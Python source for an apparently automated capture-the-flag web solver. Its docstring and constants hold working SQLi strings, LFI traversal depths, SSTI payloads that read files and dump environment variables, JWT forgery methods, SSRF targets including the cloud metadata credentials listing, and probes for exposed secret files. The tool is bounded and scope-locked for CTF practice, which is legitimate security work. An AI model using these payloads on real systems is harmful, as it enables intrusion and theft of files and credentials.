#!/usr/bin/env python3
"""proof_hunt: web Layer 1's proof reader (backlog row 383; the Day 21 build).

tools/web_open.py loads this file by name and calls

    solve_targets(targets, ctx) -> {answer_id: "proof_<32 hex>" | None}

    targets = [{"answer_id": "proof-1", "url": "https://<host>/", "index": 1, "question": "<text>"}, ...]
    ctx     = {"deadline": <epoch s | None>, "max_requests": <int, per target>, "log_dir": <path | None>,
               "challenge": <id>, "get_only": <bool, optional>}

``get_only`` (optional, default False): when True every WebClient this call builds (the hunter's own and
every sibling client from its client_factory) refuses any non-GET HTTP method and any WebSocket
conversation (application messages) before it reaches the wire, so the clue-gated state-changing siblings
below cannot send. The web lane (ctf.web_lane, B-007) sets it while Open O-2 is unsettled.

``class_sink`` (optional dict, B-237): filled per answer id with ``{"classes": {peer label: bounded
summary}, "class_hint", "stopped", "where"}`` -- the summaries the log row records as ``post_classes`` --
so an in-process caller can name why a class (e.g. the realtime-read WebSocket class) did not read.

and keeps only values ^proof_[0-9a-f]{32}$. The web agent runs the same code by name
(`tools/web_agent.py hunt <challenge id>`, the CLI at the bottom).

What it answers. ONLY a proof it read from that target's own host, and only when all of these hold; else
None:
  - the value has the stable wire form every judged web proof so far had: `proof_` + 32 lowercase hex.
    The version-4 UUID nibbles seen historically remain a strong validator recorded in the log, not a contract;
  - it came back in the answer to a bounded exploit/read path below (a payoff), and in no
    plain page (the landing page, robots.txt, a directory listing, a feed, a link the site offers, the
    search or reader page without a payload): a proof the site shows anyway is a decoy, never the answer;
  - after values on plain/baseline pages are subtracted, it is the only proof-like value (`proof_` + 32 hex,
    any case, any shape) returned by a payoff. Two distinct novel payoff values are None, whichever looks right.
A proof inside an absolute URL to another host is ignored (never followed, never read).

The initial six shapes (Days 1 to 5 of the web track, played on 2026-10-19 and 2026-10-20):
  backup   robots.txt Disallow -> the directory's open listing -> its files (a *.json.bak with the proof in a
           field such as support_note); a Disallowed file is fetched directly
  route    a JSON route inventory (/api/clues, or any JSON page the site links) names a same-host path
           (`feature_route`: /dispatch-<hex>, /process-<hex>); GET it
  idor     a feed (/api/history, /api/timeline: any JSON page linked from the site) lists object ids; the
           site names an object route (/api/briefs/1787 in the case page's text); GET the route for every
           id the feed lists, then the owner's ids +-1, +-2
  sqli     a GET search form or link parameter (q, search, query, ...): boolean payloads `') OR 1=1-- `,
           `' OR 1=1-- `, `' OR '1'='1`, `") OR 1=1-- `, `" OR 1=1-- ` beside one plain search
  lfi      a reader parameter the site links (reader.php?doc=about.php, notes.php?doc=...): ../ x 4, 6, 8, 3,
           5, 2, 10, `....//` x 6 and the absolute path, for every absolute filesystem path the start's own
           text names (any extension or none; round 2, row 393), then /run/huntress/objective.txt (the path
           the Day 4 text names), then any absolute *.txt path a page names (6 files at most; DEFAULT_FILES and
           the pages' paths within their old cap of 3). A prompt path with a destructive word is refused.
  (backup exposure and robots->listing->*.json.bak are one reader: the listing is reached from robots.txt.)

Two clue-field-driven shapes, GET only (the Day 21 web classes day-06 and day-08; backlog rows 447/469/471),
tried right after the recon wave when /api/clues names them, their route and parameter names read from the clue
fields, never hard-coded:
  sessionfix  /api/clues names `feature_route`, `secondary_route` and a `session_hint`: GET
              `feature_route?<derived-param>=<session_hint>` (which Set-Cookies the planted session), then GET
              `secondary_route` on the same cookie jar; the proof comes back from the status route. The planting
              parameter name is derived (the clue key's stem, the feature route's own `..._required` error, then a
              short known list `sid`, `session`, ...), never only `?sid=`.
  callback    /api/clues names `secondary_route` and a `callback_nonce`: GET `secondary_route?<derived-param>=
              <callback_nonce>` with the headers a same-origin browser `fetch()` sends from the feature page
              (`Sec-Fetch-*`, `Referer: <feature_route>`, `Origin`, a browser `User-Agent`); the 403-gated callback
              returns the proof. The nonce parameter name is derived from the clue key, never only `?nonce=`.
  (The day-07 stored-XSS class is a separately bounded, explicitly authorized POST path with a kill switch.)
  ssrf        /api/clues names a `feature_route` that answers a `*_required`/`*_missing` error for an absolute URL
              and an internal-only `secondary_route`: GET `feature_route?<url-ish param>=http://127.0.0.1:<port>
              <secondary_route>`, the generic SSRF param set (`url` first) joined with an internal loopback host,
              enumerated internal ports (8080, 5000, 8000, 3000, 80) and the secondary_route path; the internal
              service's own answer carries the proof (day-15 "Fetch Quest"). The pre-Day-24 generic SSRF wave only
              sent `?url=` against the SECONDARY route and never enumerated these ports, so it never formed the
              winning combo.
  ssrf-idor   /api/clues names a `feature_route` that is a GET QUERY-PARAM SSRF sink (its no-arg error names the
              slot, `target` by default; the `target_required` error word is NOT a `*_required` URL error, so the
              `ssrf` class above does not match it), plus a `topology_route` handing out an internal loopback
              case-service base URL and a `case_directory_route` listing `{id, owner}` objects. Pick an id whose
              owner != `current_role` and GET `feature_route?<param>=http://127.0.0.1:<port><svc>?id=<victim>`:
              the internal service trusts whoever reached it, so the cross-owner record (the IDOR) carries the
              proof (day-27 "Internal Affairs"). GET only; the inner URL is nested url-encoded in the sink slot.
  gateway     B-236 (`gateway_role.py` peer): the plain GET of the clue `feature_route` is a trust-boundary 403
              (`gateway_context_rejected`, `loopback_only`, or a Vary naming X-Forwarded-For). Set the client-address
              field to 127.0.0.1; when the next 403 moves and its Vary discloses one application header
              (`x-arena-<hex>`), set it to a bounded role ladder (target-named roles, administrator, admin, the
              `<role>_only` policy word), banking only a novel proof (day-30 "Framework Roulette"). GET only.
  access     the inventory JSON (`inventory_route`, else /api/inventory) + /api/clues advertise a `feature_route`,
              its query parameters (an id, a fields selector, an action), a fields list, an actions list and a
              `protected_reference`: GET the ADVERTISED route over fields x actions on the protected reference; the
              one privileged field+action combo returns the proof (day-14 "The API Has Opinions", broken access
              control). Layer 1's generic hunt refused the `/execute-`/`/process-` feature routes for their
              destructive WORD and never drove them; this reader trusts the route the inventory ADVERTISES (GET
              only) while still never sending a state-changing action VALUE (the destructive-verb guard holds).
              B-235: an action value is sent only when every word of it is a read-only verb/modifier
              (`access_action_ok`, an allowlist; an unknown verb is recorded in `refused`, never sent); when
              neither document names the query parameters, the bare route's `id_fields_action_required` error
              is split into the three names (`required_params`). Kill switch CTF_WEB_ACCESS_AUTHZ=off.

Three more, read-only, tried only when none of the six answered and no proof-like value was seen at all (the
Day 21 build, round 4; backlog row 383's read-only half):
  ssti     a GET parameter the site offers whose value the page REFLECTS (a marker sent first) and that turns an
           arithmetic expression into its product ({{a*b}}, ${a*b}, <%= a*b %>, #{a*b}, {a*b}; a and b random
           per hunt, the product absent from the reflection's answer): only then, the read payloads of the
           confirmed syntax, each one reading a FILE (the prompt's paths, then /run/huntress/objective.txt) with
           the template's own open()/File.read/readFileSync/source/fetch; nothing runs a command
  cmdi     a GET parameter of a page that already runs a lookup (its name: host, ip, domain, target, ...; or the
           single field of a GET form on a page that says ping/nslookup/dig/whois/traceroute/lookup), plus a
           clue-advertised `path` parameter only after the clue/error/response itself establishes a command
           surface: the echo
           marker `echo <tag>''$((a*b))<gat>` behind six separators in three quote contexts (only a shell that
           RUNS it prints <tag><a*b><gat>); only behind a separator and context that printed it, `cat <file>` of
           the prompt's paths and /run/huntress/objective.txt, nothing else
  jwt      a JWT the site hands out (a cookie, a header, a page or JSON body): forged with alg none, with the
           token's own HS256/384/512 secret when it is one of a small list (checked offline, no request), and
           with kid traversal (`../`x8 `dev/null`, empty key) ONLY when the token's header has a kid; the claims
           raised to admin (role/admin flags; then the identity fields too); replayed with GET, as `Authorization:
           Bearer` (and in its cookie when it came in one), against at most 3 READ endpoints (a same-host path
           that answered 401/403, or one the site names with admin/flag/proof/secret/private/internal/me/profile/
           dashboard/vault/report in it), beside the ORIGINAL token on the same endpoints (a proof the original
           token shows is the site's own: a plain page)

Four more, read-only, the Day 21 final prep, on the same terms (none answered, nothing proof-like seen):
  route    (wave 2) every non-filesystem path the start's own text names (/internal/objective; nothing under
           /run, /etc, /proc, /var, /opt, ...), 4 at most, a payoff after the plain items, behind the guard; not
           on a target whose landing page answers 410
  env      (wave 6b) /proc/self/environ (DEFAULT_FILES' last entry, LATE_FILES) through every LFI parameter and
           behind a confirmed SSTI/cmdi marker, and the confirmed syntax's config/env payloads ({{config}},
           {{config.items()}}, cycler...os.environ, <%= ENV.to_h %>, ${process.env}, #{process.env}, ...): only
           after the file reads of wave 6 found nothing, so an environment's other value never costs a proof
  ssrf     (wave 7) a GET parameter named url, uri, link, href, target, dest, feed, fetch, webhook, callback, image,
           img, avatar, proxy, remote, endpoint, site, resource or preview, or offered with an http(s):// value
           (2 at most): the offered value first as a plain baseline (only when it is empty or itself an inner
           URL; else the offered link already read), then 12 inner URLs at most: the internal URLs the prompt
           and the pages name (and an internal offered value's root), each joined with the prompt's routes,
           file:// of the prompt's paths and of /run/huntress/objective.txt, http://127.0.0.1/,
           http://localhost/, the metadata credentials listing; (wave 8) one second hop: the routes an internal
           root lists in JSON, each line of a '/'-ending listing. An inner URL is file:// or http(s) to loopback,
           RFC1918, 169.254.169.254, localhost or a single-label name (inner_ok): never a dotted name, never
           *.huntress.ctf.games, never a destructive path or query (the FHS name `run` exempt)
  access   (wave 7) every same-host path that answered 401/403 (3 at most) with X-Forwarded-For: 127.0.0.1,
           X-Real-IP: 127.0.0.1, X-Forwarded-Host: localhost, and '/' with X-Original-URL: <path> (the plain
           pages are the controls); a non-JWT cookie whose value is analyst/user/guest/viewer/member/staff set
           to admin, or whose base64 (or text) is a JSON object raised with jwt_raise(), replayed on the READ
           endpoints (401/403 first) after the ORIGINAL cookies as the control (no payoff)
  exposed  (wave 7) /.env, /.git/HEAD, /.git/logs/HEAD, /.git/config, /debug, /debug/vars, /actuator/env,
           /server-status, /phpinfo.php, /config.json, /backup.zip (one group: all are read), not on a 410
           target; a zip body's members are read for proofs (any page's)
Nothing of these was ever run against a live target.

A3 (backlog ticket): before giving up with nothing proof-like seen, a layer-ENCODED proof is recovered
OFFLINE from the bytes the waves already pulled -- no new request, GET only unchanged. Each candidate token
(a base64/base64url/base32/hex run, a data: URI, a <pre>/<code> block, an HTML-entity-decoded run, a response
header or Set-Cookie value, a JSON string value) is run through a bounded decode ladder
(base64/base64url/base32/hex/gzip/zlib/raw-DEFLATE/url-decode, short stacks of these: depth <= 4, size-capped)
and a leaf is kept only when it is EXACTLY the high-confidence auto-submit wire form. Baseline values are
subtracted; exactly one novel decoded payoff is eligible, while two novel values stay None. A distinct landing-page
decoy therefore cannot hide a successful exploit, while the same value on both sides is ineligible. The JSONL row
carries `decoded: true` and `shape: "decoded"`.

What it sends. The generic waves remain GET-only. Immediately after recon, clue-gated siblings can run the
smallest observed contracts: reset-token rebinding (one issue + one redeem), Query-only GraphQL, simplest-first
event/blob forgery, POST SSTI, delayed-query SQLi, own-profile mass assignment, an audit-operation/read/report
chain, a valid-control-plus-malformed remote-policy GET, and read-only CORS/redirect/OIDC checks. Day 27 adds
three exact-contract paths before generic waves: a validated server-first WebSocket/SSE read
(no WebSocket client frame), the one-credit Double Spent race (one synchronized burst and one audit), and an exact
clue route's trusted-proxy header GET even when its synthetic name says ``submit``. It also adds an in-band-only
XXE reader behind an exact XML POST contract and a read-only duplicate-parameter reader behind explicit public and
protected controls. Stored XSS, CSRF and upload/template paths are separately bounded and authorized. Each sibling shares the
same scope-locked client, cookie jar, deadline, stop flag and remaining request budget; a stateful sibling is
terminal after its first mutation. No PUT, DELETE or HEAD is sent and no unrelated form is submitted. The passive
endpoint inventory parses Swagger 2.0 and OpenAPI 3.0/3.1/3.2 JSON or bounded safe YAML, sitemaps, and exact linked
JavaScript/source maps; only safe GET/unknown-method routes it discovers enter its bounded phase. Redirects are never followed by the
HTTP client: a 3xx is read, and its Location is fetched only when it is on the same scheme, host and port and passes the same guard as every
other request, at most 3 hops (the second review of the reverted build: the client's own redirect handling
let a redirect reach a path the guard refuses). The guard refuses any path, parameter name or (for a link
the site offers) parameter value whose words say it changes or ends state (delete, remove, reset, logout,
drop, update, approve, ...), and any other scheme or host (solvers/toolkits/web.py WebClient is scope-locked
too). Every request is counted against ctx["max_requests"], refused once the deadline is 0.3 s away or once
solve_targets has returned (a shared stop flag, so a Mastery's threads send nothing after the return), and
its timeout is capped to the time left. It never raises: any error on a target is None for that target.

The hunt per target runs in waves of parallel GETs (6 at a time): (1) /, /robots.txt, /api/clues and
/openapi.json; (1b) exact clue-gated sibling contracts, including D11-D13 before unrelated crawl only when an
offline target-local gate matches. Explicit API evidence schedules passive inventory next. Then (2) the robots
paths, prompt routes, routes JSON pages name and links the landing page offers; otherwise inventory's blind fallback waits until (3) the listings' files,
IDOR routes, SQLi and LFI payloads and (4) the IDOR walk miss. Newly discovered inventory routes get the same
cached wave-3/4 readers. Then (5) round 4's SSTI and cmdi
markers and the JWT replays; (6) the read payloads behind a confirmed SSTI or cmdi marker; (6b) the environment
and config reads; (7) SSRF, the access headers and cookies, the exposed files; (8) the SSRF second hop; (9-11)
path normalization/cache deception, GraphQL GET reads and read-only breadth detectors. Once a novel payoff shows a proof, the requests queued for
OTHER shapes are dropped and the shape's own group finishes (its other depths, its other ids), so a second
proof from the same shape still turns the answer to None. A Mastery's targets are hunted in parallel.

CLI (what `tools/web_agent.py hunt` runs; it submits nothing):
    proof_hunt.py <challenge id> [--seconds N] [--max-requests N] [--target <answer id>=<url> ...]
reads <challenges>/day-NN/<challenge id>/start.json (or takes the targets given), prints {answer_id: proof|None}
and exits 0 when a proof was read, 2 when none, 1 on a usage or file problem. Bank with
`tools/verify.py <id> --answers FILE`.
"""
import base64
import concurrent.futures as cf
import datetime
import hashlib
import hmac
import html as _html
import json
import math
import os
import re
import sys
import threading
import time
import urllib.parse
import zlib
from pathlib import Path

# ctf package import (script runs need the checkout root on sys.path)
try:
    from ctf import env as ctf_env, paths as ctf_paths, flagfmt
except ModuleNotFoundError:
    import sys as _sys
    from pathlib import Path as _Path
    _sys.path.append(str(_Path(__file__).resolve().parents[2]))
    from ctf import env as ctf_env, paths as ctf_paths, flagfmt

HERE = Path(__file__).resolve().parent
_TK = HERE.parent / "toolkits"
if str(_TK) not in sys.path:
    sys.path.insert(0, str(_TK))

import web as _web  # noqa: E402  (solvers/toolkits/web.py: the scope-locked WebClient)

# The POST forge is deliberately a peer of this file rather than part of the broad
# GET machinery.  Add this directory for dynamic imports used by tools/web_open.py
# (where proof_hunt is loaded by file name, not as the solvers.web package).
if str(HERE) not in sys.path:
    sys.path.insert(0, str(HERE))
import security_json as _security_json  # noqa: E402 -- fail-closed target policy JSON
try:
    import forge_event as _forge_event  # noqa: E402
except Exception:                       # a partial/frozen export fails closed to GET-only
    _forge_event = None
try:
    import reset_rebind as _reset_rebind  # noqa: E402
except Exception:
    _reset_rebind = None
try:
    import graphql_read as _graphql_post_read  # noqa: E402
except Exception:
    _graphql_post_read = None
try:
    import post_chain as _post_chain  # noqa: E402
except Exception:
    _post_chain = None
try:
    import remote_policy as _remote_policy  # noqa: E402
except Exception:
    _remote_policy = None
try:
    import contract_executor as _contract_executor  # noqa: E402 -- B-149 target-described contract executor
except Exception:
    _contract_executor = None
try:
    import delegated_identity as _delegated_identity  # noqa: E402
except Exception:
    _delegated_identity = None
try:
    import queued_owner as _queued_owner  # noqa: E402
except Exception:
    _queued_owner = None
try:
    import gateway_role as _gateway_role  # noqa: E402 -- B-236 Vary-disclosed role-header reader
except Exception:
    _gateway_role = None
try:
    import endpoint_inventory as _endpoint_inventory  # noqa: E402
except Exception:
    _endpoint_inventory = None
try:
    import passive_checks as _passive_checks  # noqa: E402
except Exception:
    _passive_checks = None
try:
    import realtime_read as _realtime_read  # noqa: E402
except Exception:
    _realtime_read = None
try:
    import state_transaction as _state_transaction  # noqa: E402
except Exception:
    _state_transaction = None
try:
    import double_spend as _double_spend  # noqa: E402
except Exception:
    _double_spend = None
try:
    import xxe_read as _xml_read  # noqa: E402
except Exception:
    _xml_read = None
try:
    import hpp_read as _parameter_pollution  # noqa: E402
except Exception:
    _parameter_pollution = None
try:
    import ssrf_body as _ssrf_body  # noqa: E402
except Exception:
    _ssrf_body = None
try:
    import recon_router as _recon_router  # noqa: E402 -- bounded target-local discovery dispatcher
except Exception:
    _recon_router = None
try:
    import recon_advanced as _recon_advanced  # noqa: E402 -- strict target-described advanced contracts
except Exception:
    _recon_advanced = None
try:
    import recon_werkzeug as _recon_werkzeug  # noqa: E402 -- exact debugger PIN/objective-read contract
except Exception:
    _recon_werkzeug = None
try:
    import browser_recon as _browser_recon  # noqa: E402 -- offline response-byte analysis only
except Exception:
    _browser_recon = None
try:
    import session_recon as _session_recon  # noqa: E402 -- offline response/header analysis only
except Exception:
    _session_recon = None

# Anything proof-like counts as SEEN (any case, any hex shape): two different ones are None.
PROOF_SEEN = flagfmt.PROOF_ANYCASE
# Empirical validator: every early judged web proof had UUID-v4 nibbles, but exact_text never promised them.
PROOF_FORMAT = flagfmt.Filtered(flagfmt.PROOF_TEXT, lambda t: _uuid4_token(t), "uuid4")


def _uuid4_token(token: str) -> bool:
    """The token's 32 hex digits form a version-4 RFC 4122 UUID (an observed validator, never a gate)."""
    hexpart = token.rsplit("_", 1)[-1]
    return len(hexpart) == 32 and hexpart[12] == "4" and hexpart[16] in "89ab"


# The only value auto-returned: the stable lowercase wire shape tools/web_open.py accepts.
PROOF_WIRE = flagfmt.PROOF_TEXT
# A 200 transport status does not turn a framework's soft 404/rejection page into
# an exploit payoff. Keep this narrower than a generic "error" matcher: an
# error-based SQLi or file-include warning can itself be a successful read.
SOFT_PAYOFF_REJECTION = re.compile(
    r"(?i)\b(?:not[ -]?found|no such (?:route|resource|endpoint|page)|"
    r"unknown (?:route|endpoint|path)|(?:route|endpoint|path) (?:does not exist|is missing)|"
    r"invalid (?:route|endpoint|path|request)|method not allowed|"
    r"request (?:was )?(?:rejected|denied)|access (?:denied|forbidden)|unauthorized)\b"
)

WORKERS = 6                 # parallel GETs per target
REQUEST_TIMEOUT = 8.0       # per request, capped to the time left
DEADLINE_PAD = 0.3          # no request is sent this close to the deadline
MAX_HOPS = 3                # same-host redirects followed by hand
CLI_SECONDS = 120.0
CLI_MAX_REQUESTS = 400

# Exact OpenAPI/Swagger contract-driven GETs. Discovery and the GETs it
# authorizes share one phase ceiling: a large description must not silently
# turn this bounded reader into thirty requests before exploit waves run.
ENDPOINT_PHASE_MAX_REQUESTS = 12
ENDPOINT_DISCOVERY_MAX_REQUESTS = 6
# Backlog row 559 (Day 27): the six conventional descriptor GETs endpoint
# inventory sent one after another on an unsignalled target (every one 404 on
# all three Day 27 bases, +1.6 to +4.4 s of a hunt) now go out as ONE parallel
# wave at the start of that same phase, so they cost one round trip, not six.
# They are not sent any earlier: the D1-D20 fast paths finish before this
# phase and must keep their exact request counts (tests/test_web_blind_speed.py).
# None is dropped (a descriptor-only app is still found): inventory reads them
# from the preloaded pages and charges each to its discovery budget where it
# used to send it (``prefetched``), so nothing new (/v3/api-docs, /api-docs)
# is sent in their place.
EARLY_DESCRIPTOR_PATHS = ("/sitemap.xml", "/openapi.yaml", "/openapi.yml",
                          "/swagger.json", "/swagger.yaml", "/swagger.yml")
SPEC_GET_MAX_REQUESTS = 6
SPEC_GET_MAX_VARIANTS = 2
# Offline browser/session evidence must never consume an unbounded share of a
# timed attempt after the wire response has arrived.  These are reconnaissance
# only, so skip them near the deadline and cap each analyzer independently.
OFFLINE_ANALYSIS_MAX_ITEMS = 24
OFFLINE_ANALYSIS_MAX_BYTES = 4 << 20
OFFLINE_ANALYSIS_MIN_SECONDS = 1.0
LEGACY_TEXT_MAX = 1_000_000

# A control whose complete semantic body was not available cannot establish
# the subtraction set. Treating a later proof as novel in that situation is
# unsound even when the visible prefix contained no proof-like token.
_BASELINE_INTEGRITY_KEYS = (
    "truncated", "incomplete", "incomplete_fragment", "timed_out",
    "limit_error", "protocol_error", "framing_error", "stream_error",
)


def _baseline_response_incomplete(response, *, framing_error=None, baseline_text=None):
    """Whether a response is unsafe as a complete novelty baseline.

    ``forge_event.response_baseline_text`` owns bounded carrier decoding and
    serializes an integrity sentinel ahead of display text. Consume that
    sentinel rather than attempting to infer which missing bytes mattered.
    The local metadata/declaration checks keep the partial-export fallback
    fail-closed when the carrier helper is unavailable.
    """
    if framing_error or not isinstance(response, dict):
        return bool(framing_error)
    if any(bool(response.get(key)) for key in _BASELINE_INTEGRITY_KEYS):
        return True
    marker = (getattr(_forge_event, "BASELINE_STRICT_INCOMPLETE",
                      "<!-- huntress-baseline-strict-set:incomplete -->")
              if _forge_event is not None
              else "<!-- huntress-baseline-strict-set:incomplete -->")
    if (baseline_text is None and _forge_event is not None
            and hasattr(_forge_event, "response_baseline_text")):
        try:
            baseline_text = _forge_event.response_baseline_text(response)
        except Exception:
            return True
    if marker and marker in str(baseline_text or ""):
        return True
    if _forge_event is not None and hasattr(_forge_event, "response_baseline_text"):
        return False

    # Frozen/partial exports without the carrier reader cannot establish the
    # completeness of a non-empty encoded or container body. Empty bodies do
    # not conceal a suffix merely because a carrier header was present.
    body = response.get("body", response.get("text", b""))
    if not body:
        return False
    if isinstance(body, (str, bytes, bytearray, memoryview)) and len(body) > LEGACY_TEXT_MAX:
        return True
    pairs = response.get("response_header_pairs")
    if not isinstance(pairs, (list, tuple)):
        raw = response.get("response_headers", response.get("headers", {}))
        pairs = list(raw.items()) if isinstance(raw, dict) else []
    elif len(pairs) > 512:
        return True
    values = {}
    for row in list(pairs)[:513]:
        if isinstance(row, (list, tuple)) and len(row) == 2:
            values.setdefault(str(row[0]).strip().lower(), []).append(
                str(row[1]).strip().lower())
    encodings = values.get("content-encoding", [])
    ctypes = values.get("content-type", [])
    return bool(any(value and value != "identity" for value in encodings)
                or any(value.startswith("multipart/") or "application/zip" in value
                       or "application/x-tar" in value for value in ctypes))


def _legacy_response_views(response, body, header_pairs):
    """One strict text view for a partial export without response_carriers.

    This deliberately does not decode compression, MIME, archives, charsets,
    or replacement text. A partial/frozen export must lose coverage rather
    than retain a second, weaker interpretation of target bytes.
    """
    if not isinstance(response, dict) or _baseline_response_incomplete(response):
        return []
    values = {}
    for name, value in list(header_pairs or [])[:512]:
        values.setdefault(str(name).strip().lower(), []).append(str(value).strip())
    for name in ("content-type", "content-encoding"):
        distinct = {value.casefold() for value in values.get(name, [])}
        if len(distinct) > 1:
            return []
    if any(value and value.casefold() != "identity"
           for value in values.get("content-encoding", [])):
        return []
    ctype = (values.get("content-type") or [""])[0].lower()
    media_type = ctype.split(";", 1)[0].strip()
    if (media_type.startswith("multipart/") or media_type in {
            "application/zip", "application/x-zip-compressed",
            "application/x-tar", "application/tar", "application/octet-stream"}):
        return []
    try:
        if isinstance(body, (bytes, bytearray, memoryview)):
            raw = bytes(body)
            if len(raw) > LEGACY_TEXT_MAX or raw.startswith((b"PK\x03\x04", b"\x1f\x8b")):
                return []
            text = raw.decode("utf-8", "strict")
        elif isinstance(body, str) and len(body) <= LEGACY_TEXT_MAX:
            text = body
        else:
            return []
    except UnicodeDecodeError:
        return []
    if media_type == "application/json" or media_type.endswith("+json"):
        try:
            _security_json.loads(text, max_chars=LEGACY_TEXT_MAX)
        except Exception:
            return []
    return [text]


def _page_baseline_texts(page):
    """Independent conservative subtraction records retained for a saved page."""
    if not isinstance(page, dict):
        return []
    saved = page.get("baseline_text")
    if isinstance(saved, str):
        return [saved]
    response = page.get("_peer_response")
    carrier = ""
    if (isinstance(response, dict) and _forge_event is not None
            and hasattr(_forge_event, "response_baseline_text")):
        try:
            carrier = str(_forge_event.response_baseline_text(response) or "")
        except Exception:
            carrier = ""
    # ``evidence_text`` may include conservative page-level controls gathered
    # before the exact raw entity was preserved for peers. Keep it as a
    # separate fragment instead of replacing it with the carrier reconstruction.
    page_evidence = str(page.get("evidence_text") or page.get("text") or "")
    pieces = []
    for value in (carrier, page_evidence):
        if value and value not in pieces:
            pieces.append(value)
    if not pieces:
        return []
    boundary = getattr(
        _forge_event, "BASELINE_FRAGMENT_BOUNDARY",
        "\n<!-- huntress-baseline-fragment-boundary -->\n")
    marker = getattr(
        _forge_event, "BASELINE_STRICT_INCOMPLETE",
        "<!-- huntress-baseline-strict-set:incomplete -->")
    limit = int(getattr(_forge_event, "MAX_TEXT", LEGACY_TEXT_MAX))
    prefix = marker + boundary
    return [value if len(value) <= limit else
            prefix + value[:max(0, limit - len(prefix))]
            for value in pieces]


def _page_baseline_text(page):
    """Compatibility serialization of a page's independent baseline records."""
    records = _page_baseline_texts(page)
    if not records:
        return ""
    boundary = getattr(
        _forge_event, "BASELINE_FRAGMENT_BOUNDARY",
        "\n<!-- huntress-baseline-fragment-boundary -->\n")
    return boundary.join(records)
SPEC_VERSION_PARAM = re.compile(
    r"(?i)^(?:v|(?:[a-z0-9]+[-_.])*(?:api[-_.]?)?version)$"
)
SPEC_CREDENTIAL_PARAM = re.compile(
    r"(?i)(?:^|[-_.])(?:authorization|auth|api[-_.]?key|access[-_.]?key|client[-_.]?key|key|"
    r"credential|secret|token|password|passwd|session|cookie|signature|sig|jwt|bearer)(?:$|[-_.])"
)
_SPEC_TOKEN = r"[A-Za-z0-9!#$%&'*+.^_`|~-]"
SPEC_MEDIA_TYPE = re.compile(
    rf"^{_SPEC_TOKEN}{{1,64}}/{_SPEC_TOKEN}{{1,80}}"
    rf"(?: *; *{_SPEC_TOKEN}{{1,40}} *= *(?:{_SPEC_TOKEN}{{1,80}}|"
    r'"(?:[ !#-\[\]-~]|\\[ -~]){0,80}")){0,4}$'
)

DEFAULT_FILES = ("/run/huntress/objective.txt", "/proc/self/environ")
# Read only in wave 6b (the Day 21 final prep): after every other file read found nothing, so a process
# environment holding some other proof-like value never turns a proof already read into None.
LATE_FILES = ("/proc/self/environ",)
MAX_FILES = 6               # files read through an LFI parameter: the prompt's paths first, then DEFAULT_FILES
MAX_PAGE_FILES = 3          # DEFAULT_FILES and the *.txt paths a PAGE names (the rule before round 2)
LFI_DEPTHS = (4, 6, 8, 3, 5, 2, 10)
SQLI_PAYLOADS = ("') OR 1=1-- ", "' OR 1=1-- ", "' OR '1'='1", "\") OR 1=1-- ", "\" OR 1=1-- ")
SQLI_BASELINE = ""          # the plain search: everything the app shows anyway
SEARCH_WORDS = ("q", "query", "search", "term", "s", "keyword", "keywords", "k", "find", "lookup", "filter",
                "title", "name", "text", "phrase")
FILE_WORDS = ("doc", "file", "page", "path", "view", "template", "tpl", "include", "inc", "load", "read",
              "document", "note", "report", "show", "src", "source", "lang", "module", "content")
BACKUP_EXT = (".bak", ".old", ".orig", ".backup", ".save", ".swp", ".copy", "~", ".bak.json", ".sql",
              ".env", ".json", ".txt", ".zip", ".tar.gz", ".tgz", ".yml", ".yaml", ".conf", ".ini", ".cfg")
ASSET_EXT = (".css", ".js", ".mjs", ".svg", ".png", ".jpg", ".jpeg", ".gif", ".ico", ".webp", ".woff",
             ".woff2", ".ttf", ".otf", ".map", ".mp4", ".mp3", ".pdf")

# Round 4 (row 383's read-only half): SSTI, command injection and JWT, read-only, after the six shapes.
SSTI_PROBES = (("curly", "{{@A@*@B@}}"), ("dollar", "${@A@*@B@}"), ("erb", "<%= @A@*@B@ %>"),
               ("hash", "#{@A@*@B@}"), ("smarty", "{@A@*@B@}"),
               # Velocity (#set/$ref): the day-23 build. Jinja2/Twig ride `curly`; Freemarker rides `dollar`
               # (it evaluates ${a*b}); Velocity needs its own #set directive to compute and print the product.
               ("velocity", "#set($hzc=@A@*@B@)$hzc"))
# read payloads per confirmed syntax: each one READS the file @F@ (no command is run by any of them)
SSTI_READS = {
    "curly": ("{{ lipsum.__globals__['__builtins__']['open']('@F@').read() }}",
              "{{ cycler.__init__.__globals__.__builtins__.open('@F@').read() }}",
              "{{ source('@F@') }}",
              "{{ range.constructor(\"return process.mainModule.require('fs').readFileSync('@F@','utf8')\")() }}"),
    "dollar": ("${open('@F@').read()}", "${process.mainModule.require('fs').readFileSync('@F@','utf8')}"),
    "erb": ("<%= File.read('@F@') %>", "<%= process.mainModule.require('fs').readFileSync('@F@','utf8') %>"),
    "hash": ("#{File.read('@F@')}", "#{process.mainModule.require('fs').readFileSync('@F@','utf8')}"),
    "smarty": ("{fetch file='@F@'}", "{'@F@'|file_get_contents}"),
}
# The Day 21 final prep: the template's config and the process environment, read once per confirmed syntax (a
# payload with no @F@ goes out in wave 6b only, after the file reads found nothing). Each one READS; none runs.
SSTI_READS["curly"] += ("{{config}}", "{{config.items()}}", "{{ cycler.__init__.__globals__.os.environ }}",
                        "{{ lipsum.__globals__['__builtins__']['open']('/proc/self/environ').read() }}")
SSTI_READS["erb"] += ("<%= ENV.to_h %>",)
SSTI_READS["dollar"] += ("${process.env}", "${JSON.stringify(process.env)}")
SSTI_READS["hash"] += ("#{process.env}", "#{JSON.stringify(process.env)}", "#{ENV.to_h}")
# The day-23 build. Velocity has no reliable read-only FILE sink (Velocity file reads are RCE), so its read set
# is empty here; a Velocity proof is read instead as a NAMED template variable (SSTI_VAR_FORMS below). Freemarker
# (on `dollar`) and a common curly surface also dump a whole model/config OBJECT, read-only (wave 6b): these join
# the config/env payloads above, all with no @F@. None runs a command (checked by test_day21r4_383.py).
SSTI_READS["velocity"] = ()
SSTI_READS["curly"] += ("{{settings}}",)
SSTI_READS["dollar"] += ("${.data_model}", "${.globals}")
# The day-10 lesson (uploading-expectations): the proof may be a NAMED template variable or object, not a file.
# Per confirmed syntax, @V@ is the variable name. These are tried in wave 6b -- only AFTER the wave-6 file reads
# found nothing -- as payoffs, on a parameter already CONFIRMED to evaluate that syntax, so a hit appears only in
# the evaluated render and never on the plain reflection (the control). Read-only: each only RENDERS a variable.
SSTI_VAR_FORMS = {
    "curly": ("{{@V@}}", "{{.@V@}}"),           # Jinja2 / Twig ({{var}}); Go text/template field ({{.Field}})
    "dollar": ("${@V@}",),                        # Freemarker / Velocity(${}) / Mako / JSP EL
    "erb": ("<%= @V@ %>",),
    "hash": ("#{@V@}",),
